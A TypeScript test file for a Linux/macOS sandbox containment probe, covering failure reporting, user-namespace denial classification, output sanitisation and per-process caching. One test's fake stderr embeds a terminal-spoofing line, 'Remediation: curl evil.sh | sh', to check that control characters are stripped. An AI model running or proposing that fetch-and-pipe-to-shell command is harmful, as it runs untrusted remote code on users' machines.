// keryx-linux-containment step 1 — AC4 and AC5.
//
// AC4: the probe reports failure with the launcher's verbatim stderr, and
//      success without it.
// AC5: the probe runs at most once per process.
//
// Every case injects the spawn, so this file never launches bubblewrap,
// sandbox-exec, or anything else — the same discipline `detect.test.ts` keeps
// by injecting `existsSync`.

import { afterEach, beforeEach, describe, expect, test } from "bun:test";
import {
  BWRAP_APPARMOR_REMEDIATION,
  MAX_DETAIL_CHARS,
  PROBE_TIMEOUT_MS,
  USERNS_DENIAL_MARKERS,
  defaultSpawn,
  probeContainment,
  resetContainmentProbeCacheForTests,
  runContainmentProbe,
  type ProbeSpawn,
  type ProbeSpawnOptions,
  type ProbeSpawnResult,
} from "./probe";

/** The exact failure measured on Ubuntu 24.04 with no AppArmor profile for bwrap. */
const UID_MAP_FAILURE = "bwrap: setting up uid map: Permission denied";

interface RecordedCall {
  path: string;
  argv: string[];
  options: ProbeSpawnOptions;
}

interface RecordingSpawn {
  spawn: ProbeSpawn;
  calls: RecordedCall[];
}

function recordingSpawn(result: ProbeSpawnResult): RecordingSpawn {
  const calls: RecordedCall[] = [];
  return {
    calls,
    spawn: (path, argv, options) => {
      calls.push({ path, argv, options });
      return result;
    },
  };
}

// The cache is process-global by design (N4). Cleared on BOTH sides: `afterEach`
// so this file cannot leak into another, and `beforeEach` so this file does not
// merely *assume* an empty slot on entry. Under `bun test` every file shares one
// process, so a one-sided reset makes these assertions order-dependent, and an
// order-dependent failure surfaces in whichever unrelated file ran next.
beforeEach(resetContainmentProbeCacheForTests);
afterEach(resetContainmentProbeCacheForTests);

describe("runContainmentProbe — AC4: the launcher's own words are the evidence", () => {
  test("linux failure: reports not-ok, layer bwrap, and the stderr VERBATIM", () => {
    const { spawn } = recordingSpawn({ status: 1, stderr: `${UID_MAP_FAILURE}\n` });
    const result = runContainmentProbe({ platform: "linux", launcherPath: "/usr/bin/bwrap", spawn, cwd: "/tmp" });

    expect(result.ok).toBe(false);
    expect(result.layer).toBe("bwrap");
    // Verbatim: not paraphrased, not prefixed, not summarised. Only the
    // trailing newline is trimmed.
    expect(result.detail).toBe(UID_MAP_FAILURE);
  });

  test("a uid-map denial is classified as a userns denial and gets the AppArmor remediation", () => {
    const { spawn } = recordingSpawn({ status: 1, stderr: UID_MAP_FAILURE });
    const result = runContainmentProbe({ platform: "linux", spawn, cwd: "/tmp" });

    expect(result.cause).toBe("unprivileged-userns-denied");
    expect(result.remediation).toBe(BWRAP_APPARMOR_REMEDIATION);
    expect(result.remediation).toContain("/etc/apparmor.d/bwrap");
  });

  test("a failure that is NOT a userns denial gets no remediation and no invented cause", () => {
    // The defect this guards against: attaching the AppArmor remediation to
    // every bwrap failure would send a user with a read-only-filesystem problem
    // to author a security policy that cannot possibly help them — a diagnosis
    // the probe never made, which is this package's own defect in miniature.
    const { spawn } = recordingSpawn({
      status: 1,
      stderr: "bwrap: Can't mkdir /run/user/1000: Read-only file system",
    });
    const result = runContainmentProbe({ platform: "linux", spawn });

    expect(result.ok).toBe(false);
    expect(result.cause).toBe("unknown");
    expect(result.remediation).toBeUndefined();
    // The launcher's words still come through — that is the whole finding.
    expect(result.detail).toContain("Read-only file system");
  });

  test("other phrasings of the same withdrawal are still recognised", () => {
    for (const stderr of [
      "bwrap: No permissions to creating new namespace, likely because the kernel does not allow non-privileged user namespaces",
      "bwrap: setting up uid map: Permission denied",
      "bwrap: setting up gid map: Permission denied",
      // util-linux's real wording, taken from `unshare --user --map-root-user
      // true` on 2.39.3 rather than guessed. An earlier revision of the marker
      // list asserted a string util-linux never prints.
      "unshare: write failed /proc/self/uid_map: Operation not permitted",
      "unshare: unshare failed: Operation not permitted",
    ]) {
      const { spawn } = recordingSpawn({ status: 1, stderr });
      expect(runContainmentProbe({ platform: "linux", spawn }).cause).toBe("unprivileged-userns-denied");
    }
  });

  test("messages that merely MENTION namespaces are not diagnosed as denials", () => {
    // The markers must be at least as specific as the conclusion they license.
    // Bare `unshare`/`userns` substrings matched all of these and handed the
    // operator an AppArmor profile to write for a problem it cannot fix — the
    // same misdiagnosis the classifier was added to prevent, arriving through
    // the classifier itself.
    for (const stderr of [
      "bwrap: Unknown option --unshare-pid",
      "bwrap: Can't find source path /usr/lib/userns-helper: No such file or directory",
      "spawnSync /usr/bin/unshare ENOENT",
      "bwrap: execvp /bin/true: No such file or directory",
    ]) {
      const { spawn } = recordingSpawn({ status: 1, stderr });
      const result = runContainmentProbe({ platform: "linux", spawn });
      expect(result.cause).toBe("unknown");
      expect(result.remediation).toBeUndefined();
    }
  });

  test("no marker subsumes another, so every entry can actually fire", () => {
    // `classifyFailure` runs `includes` per marker, so a phrase containing
    // another is dead code that makes the list read as broader than it is —
    // and this list's specificity is the safety property it exists for.
    for (const marker of USERNS_DENIAL_MARKERS) {
      const others = USERNS_DENIAL_MARKERS.filter((m) => m !== marker);
      expect(others.filter((m) => marker.includes(m))).toEqual([]);
    }
  });

  test("a darwin failure is never diagnosed as a user-namespace denial", () => {
    // Only bubblewrap builds its boundary from user namespaces. A seatbelt
    // failure whose text happens to contain a matching phrase must not borrow
    // another mechanism's cause — it would surface in `--json` as a diagnosis
    // of a launcher that does not work that way.
    const { spawn } = recordingSpawn({ status: 1, stderr: "sandbox-exec: user namespace nonsense" });
    const result = runContainmentProbe({ platform: "darwin", spawn });
    expect(result.cause).toBe("unknown");
    expect(result.remediation).toBeUndefined();
  });

  test("R8 / AC13: the remediation never names the machine-wide sysctl", () => {
    // ADR-0010 rejected `sysctl kernel.apparmor_restrict_unprivileged_userns=0`
    // outright — it disables the restriction for every process on the machine
    // to fix one program — and the advice was deleted from the runbook and the
    // operator guide. A test, not a review convention, keeps it deleted.
    const { spawn } = recordingSpawn({ status: 1, stderr: UID_MAP_FAILURE });
    const result = runContainmentProbe({ platform: "linux", spawn });

    const emitted = `${result.detail ?? ""}\n${result.remediation ?? ""}`;
    expect(emitted).not.toContain("apparmor_restrict_unprivileged_userns");
    expect(emitted).not.toContain("sysctl");
  });

  test("linux success: ok, and NO detail, cause or remediation — there is no evidence to quote", () => {
    const { spawn } = recordingSpawn({ status: 0, stderr: "" });
    const result = runContainmentProbe({ platform: "linux", spawn });

    expect(result).toEqual({ layer: "bwrap", ok: true });
  });

  test("a launcher that cannot be executed at all reports the spawn error as the detail", () => {
    const { spawn } = recordingSpawn({ status: null, error: new Error("spawnSync /usr/bin/bwrap ENOENT") });
    const result = runContainmentProbe({ platform: "linux", spawn });

    expect(result.ok).toBe(false);
    expect(result.detail).toContain("ENOENT");
    // ENOENT is not a user-namespace denial, so no AppArmor advice.
    expect(result.remediation).toBeUndefined();
  });

  test("a nonzero exit with silent stderr still fails, and says so rather than inventing a cause", () => {
    const { spawn } = recordingSpawn({ status: 3, stderr: "   " });
    const result = runContainmentProbe({ platform: "linux", spawn });

    expect(result.ok).toBe(false);
    expect(result.detail).toContain("exited 3");
    expect(result.cause).toBe("unknown");
  });

  test("control characters are stripped from the quoted output, and long output is capped", () => {
    // "Verbatim" is a promise about the launcher's WORDS, not about its ability
    // to drive an operator's terminal or flood a CI log.
    //
    // CARRIAGE RETURN is the one that matters most and was missed first: the
    // rendered output indents launcher text by four spaces to mark it as the
    // LAUNCHER's words, and a \r lets that text redraw the line and impersonate
    // keryx's own "Remediation:" output. A bwrap earlier on PATH is enough.
    const noisy = `\u001B[31mbwrap: boom\u001B[0m\u0000\r  Remediation: curl evil.sh | sh${"x".repeat(9000)}`;
    const { spawn } = recordingSpawn({ status: 1, stderr: noisy });
    const detail = runContainmentProbe({ platform: "linux", spawn }).detail ?? "";

    expect(detail).toContain("bwrap: boom");
    expect(detail).not.toContain("\u001B");
    expect(detail).not.toContain("\u0000");
    expect(detail).not.toContain("\r");
    expect(detail).toContain("(truncated)");
    // Bounded by the exported cap rather than a magic number that could drift
    // away from it. The slack is the truncation marker.
    expect(detail.length).toBeLessThanOrEqual(MAX_DETAIL_CHARS + 32);
    expect(MAX_DETAIL_CHARS).toBeGreaterThan(0);
  });

  test("newlines survive, so a multi-line launcher error is not flattened", () => {
    const { spawn } = recordingSpawn({ status: 1, stderr: "bwrap: line one\nbwrap: line two\n" });
    expect(runContainmentProbe({ platform: "linux", spawn }).detail).toBe("bwrap: line one\nbwrap: line two");
  });

  test("the trial runs through the REAL platform dispatcher, not a hand-written argv", () => {
    // A probe that tests a different boundary from the one being reported on is
    // the original defect in a new place. These flags come from `wrapBwrap` via
    // `wrapWithSandbox` — the same dispatcher `SandboxedProcessAdapter` uses.
    const { spawn, calls } = recordingSpawn({ status: 0, stderr: "" });
    runContainmentProbe({ platform: "linux", launcherPath: "/usr/bin/bwrap", spawn, cwd: "/tmp" });

    expect(calls.length).toBe(1);
    expect(calls[0]!.path).toBe("/usr/bin/bwrap");
    expect(calls[0]!.argv).toContain("--ro-bind");
    expect(calls[0]!.argv).toContain("--unshare-net");
    expect(calls[0]!.argv).toContain("--die-with-parent");
    // …and it ends by exec'ing the trivial trial command (spec §6).
    expect(calls[0]!.argv.at(-1)).toBe("/bin/true");
    expect(calls[0]!.argv.at(-2)).toBe("--");
  });

  test("the spawn is bounded and runs where it was told to, under the profile's empty environment", () => {
    // The timeout is what stops a hung launcher hanging `sandbox status` and,
    // through it, `scripts/install.sh`. Without this assertion a regression that
    // dropped it would be invisible to the whole suite.
    const { spawn, calls } = recordingSpawn({ status: 0, stderr: "" });
    runContainmentProbe({ platform: "linux", spawn, cwd: "/tmp/somewhere" });

    expect(calls[0]!.options.timeoutMs).toBe(PROBE_TIMEOUT_MS);
    // Comparing the forwarded value against the constant it came from cannot
    // fail if the CONSTANT regresses — and `spawnSync` treats 0 as "no
    // timeout", so a regression to 0 would silently remove the bound this
    // assertion claims to defend. Pin that it is a bound, not just that it is
    // forwarded.
    expect(PROBE_TIMEOUT_MS).toBeGreaterThan(0);
    expect(PROBE_TIMEOUT_MS).toBeLessThanOrEqual(60_000);
    expect(calls[0]!.options.cwd).toBe("/tmp/somewhere");
    // The trial profile describes an empty environment; running it under the
    // parent's would make the probe less faithful than the thing it reports on.
    expect(calls[0]!.options.env).toEqual({});
  });

  test("darwin: probes through sandbox-exec and reports the seatbelt layer", () => {
    const { spawn, calls } = recordingSpawn({ status: 0, stderr: "" });
    const result = runContainmentProbe({ platform: "darwin", spawn, cwd: "/tmp" });

    expect(result).toEqual({ layer: "seatbelt", ok: true });
    expect(calls[0]!.path).toBe("/usr/bin/sandbox-exec");
    expect(calls[0]!.argv).toContain("-p");
    expect(calls[0]!.argv.at(-1)).toBe("/usr/bin/true");
  });

  test("darwin failure carries the launcher's stderr but no remediation — there is none to give", () => {
    const { spawn } = recordingSpawn({ status: 1, stderr: "sandbox-exec: sandbox_apply: Operation not permitted" });
    const result = runContainmentProbe({ platform: "darwin", spawn });

    expect(result.ok).toBe(false);
    expect(result.detail).toBe("sandbox-exec: sandbox_apply: Operation not permitted");
    expect(result.remediation).toBeUndefined();
  });

  test("an unsupported platform is `none`, not-ok, and spawns nothing at all", () => {
    const { spawn, calls } = recordingSpawn({ status: 0, stderr: "" });
    const result = runContainmentProbe({ platform: "win32", spawn });

    expect(result.layer).toBe("none");
    expect(result.ok).toBe(false);
    expect(calls.length).toBe(0);
    // The dispatcher's own fail-closed reason is carried through rather than
    // replaced with a sentence of the probe's own.
    expect(result.detail).toContain("win32");
  });

  test("the reported layer is read off the DISPATCHER's output, not re-derived from the platform", () => {
    // Round-2 finding: the trial argv came from `wrapWithSandbox` but the layer
    // LABEL was still computed from the platform string — a second, independent
    // platform-to-layer decision. It is the label that `sandbox status` prints,
    // that `--json` publishes, and that the bubblewrap AppArmor remediation is
    // keyed on, so when step 3 adds the Landlock branch a platform-derived
    // label would call a Landlock trial "bwrap" and hand its failure a
    // remediation for a launcher that never ran.
    //
    // The label is now read from the launcher name the dispatcher put in
    // `argv[0]`. What a test can observe is that the label and the binary
    // actually spawned always agree — if the two decisions ever diverge, this
    // is where it shows. (The divergence itself only becomes constructible at
    // step 3, when `wrapWithSandbox` gains a third branch; an unrecognised
    // launcher is covered by the next test.)
    const linux = recordingSpawn({ status: 0, stderr: "" });
    expect(runContainmentProbe({ platform: "linux", spawn: linux.spawn, launcherPath: "/usr/bin/bwrap" }).layer).toBe(
      "bwrap",
    );
    expect(linux.calls[0]!.path).toBe("/usr/bin/bwrap");

    const darwin = recordingSpawn({ status: 0, stderr: "" });
    expect(runContainmentProbe({ platform: "darwin", spawn: darwin.spawn }).layer).toBe("seatbelt");
    expect(darwin.calls[0]!.path).toBe("/usr/bin/sandbox-exec");
  });

  test("a launcher the probe cannot name is a FAILURE, not a guess", () => {
    // The forcing function for step 3. If `wrapWithSandbox` gains a Landlock
    // branch and `layerOfWrappedCommand` is not updated, the probe must report
    // "could not identify the layer" rather than silently calling it bwrap —
    // and, critically, must not hand it the bubblewrap remediation.
    //
    // Stands in for step 3's dispatcher: a wrapped command whose launcher this
    // probe has never heard of.
    const { spawn, calls } = recordingSpawn({ status: 0, stderr: "" });
    const result = runContainmentProbe({
      platform: "linux",
      spawn,
      wrap: (command) => ({
        ok: true,
        wrapped: true,
        command: { ...command, path: "/usr/bin/landlock-exec", argv: ["landlock-exec", "--", command.path] },
      }),
    });

    expect(result.ok).toBe(false);
    expect(result.layer).toBe("none");
    expect(result.detail).toContain("cannot identify");
    expect(result.detail).toContain("landlock-exec");
    expect(result.remediation).toBeUndefined();
    // And nothing was spawned: a layer we cannot name is not one we trial.
    expect(calls.length).toBe(0);
  });

  test("a dispatcher that declines to wrap the trial is a FAILURE, not a silent pass", () => {
    // Reachable only through the injected dispatcher (`trialProfile()` never
    // sets `danger-full-access`), but the branch has to be right: an unwrapped
    // command proves nothing about containment, and reporting it as success
    // would be the worst possible false green.
    const { spawn, calls } = recordingSpawn({ status: 0, stderr: "" });
    const result = runContainmentProbe({
      platform: "linux",
      spawn,
      wrap: (command) => ({ ok: true, wrapped: false, command }),
    });

    expect(result.ok).toBe(false);
    expect(result.detail).toContain("not wrapped");
    expect(calls.length).toBe(0);
  });

  test("a dispatcher that refuses outright carries its own reason through", () => {
    const { spawn } = recordingSpawn({ status: 0, stderr: "" });
    const result = runContainmentProbe({
      platform: "linux",
      spawn,
      wrap: () => ({ ok: false, reason: "network=restricted is not yet enforced on Linux" }),
    });

    expect(result.ok).toBe(false);
    expect(result.layer).toBe("none");
    expect(result.detail).toBe("network=restricted is not yet enforced on Linux");
  });

  test("falsifiable: a spawn that succeeds and one that fails do not produce the same result", () => {
    // Proves the assertions above are load-bearing rather than reading a
    // constant: the ONLY difference between these two calls is the injected
    // exit status.
    const ok = runContainmentProbe({ platform: "linux", spawn: recordingSpawn({ status: 0, stderr: "" }).spawn });
    const bad = runContainmentProbe({
      platform: "linux",
      spawn: recordingSpawn({ status: 1, stderr: UID_MAP_FAILURE }).spawn,
    });
    expect(ok.ok).not.toBe(bad.ok);
    expect(ok.detail).toBeUndefined();
    expect(bad.detail).toBe(UID_MAP_FAILURE);
  });
});

describe("defaultSpawn — the one path that really starts a process", () => {
  // Everything above replaces the whole spawn, so the plumbing between
  // `ProbeSpawnOptions` and `spawnSync` — the timeout that stops a hung
  // launcher hanging `install.sh`, the empty env the trial profile promises,
  // the piped stderr the evidence comes from — was asserted nowhere. These
  // inject `spawnSync` itself rather than the spawn, so the real forwarding is
  // under test without a real launcher.
  interface Recorded {
    path: string;
    argv: readonly string[];
    options: { cwd?: string; env?: Record<string, string>; timeout?: number; encoding?: string; stdio?: unknown };
  }

  function fakeSpawnSync(result: { status: number | null; stderr?: string; error?: Error }) {
    const calls: Recorded[] = [];
    const fn = ((path: string, argv: readonly string[], options: Recorded["options"]) => {
      calls.push({ path, argv, options });
      return result;
    }) as unknown as typeof import("node:child_process").spawnSync;
    return { calls, fn };
  }

  test("forwards cwd, the empty env, the timeout, and pipes stderr", () => {
    const { calls, fn } = fakeSpawnSync({ status: 0, stderr: "" });
    defaultSpawn(fn)("/usr/bin/bwrap", ["--ro-bind", "/", "/"], {
      cwd: "/tmp/work",
      env: {},
      timeoutMs: PROBE_TIMEOUT_MS,
    });

    expect(calls.length).toBe(1);
    expect(calls[0]!.path).toBe("/usr/bin/bwrap");
    expect(calls[0]!.options.cwd).toBe("/tmp/work");
    expect(calls[0]!.options.env).toEqual({});
    // `timeoutMs` must land on `spawnSync`'s `timeout`, not be dropped by a
    // rename. This is the assertion that a hung launcher cannot outlast.
    expect(calls[0]!.options.timeout).toBe(PROBE_TIMEOUT_MS);
    expect(calls[0]!.options.encoding).toBe("utf8");
    expect(calls[0]!.options.stdio).toEqual(["ignore", "pipe", "pipe"]);
  });

  test("normalises the spawnSync result into a ProbeSpawnResult", () => {
    const ok = defaultSpawn(fakeSpawnSync({ status: 0, stderr: "" }).fn)("/x", [], {
      cwd: "/",
      env: {},
      timeoutMs: 1,
    });
    expect(ok).toEqual({ status: 0, stderr: "" });

    const error = new Error("spawnSync /usr/bin/bwrap ENOENT");
    const failed = defaultSpawn(fakeSpawnSync({ status: null, error }).fn)("/x", [], {
      cwd: "/",
      env: {},
      timeoutMs: 1,
    });
    expect(failed.status).toBeNull();
    expect(failed.error).toBe(error);
    // Absent stderr becomes "", so callers never have to guard it.
    expect(failed.stderr).toBe("");
  });
});

describe("probeContainment — AC5: at most one probe per process", () => {
  test("a second call spawns nothing and returns the first result", () => {
    const { spawn, calls } = recordingSpawn({ status: 1, stderr: UID_MAP_FAILURE });

    const first = probeContainment({ platform: "linux", spawn });
    const second = probeContainment({ platform: "linux", spawn });
    const third = probeContainment({ platform: "linux", spawn });

    expect(calls.length).toBe(1);
    expect(second).toBe(first);
    expect(third).toBe(first);
  });

  test("the cache holds even when a later caller passes different options", () => {
    // N4 is a bound on how many contained commands one process may spawn, not a
    // per-argument memo. A caller that could defeat it by varying its options
    // would satisfy the letter of "cached" and none of the requirement.
    const first = recordingSpawn({ status: 1, stderr: UID_MAP_FAILURE });
    const second = recordingSpawn({ status: 0, stderr: "" });

    probeContainment({ platform: "linux", spawn: first.spawn });
    const again = probeContainment({ platform: "darwin", spawn: second.spawn });

    expect(second.calls.length).toBe(0);
    expect(again.ok).toBe(false);
  });

  test("falsifiable: the uncached entry point does spawn every time", () => {
    // Without this, "calls.length === 1" above could be true because the fake
    // spawn is never reached at all.
    const { spawn, calls } = recordingSpawn({ status: 0, stderr: "" });
    runContainmentProbe({ platform: "linux", spawn });
    runContainmentProbe({ platform: "linux", spawn });
    expect(calls.length).toBe(2);
  });

  test("the test-only reset actually clears the slot", () => {
    const first = recordingSpawn({ status: 0, stderr: "" });
    probeContainment({ platform: "linux", spawn: first.spawn });
    resetContainmentProbeCacheForTests();

    const second = recordingSpawn({ status: 1, stderr: UID_MAP_FAILURE });
    const result = probeContainment({ platform: "linux", spawn: second.spawn });

    expect(second.calls.length).toBe(1);
    expect(result.ok).toBe(false);
  });
});
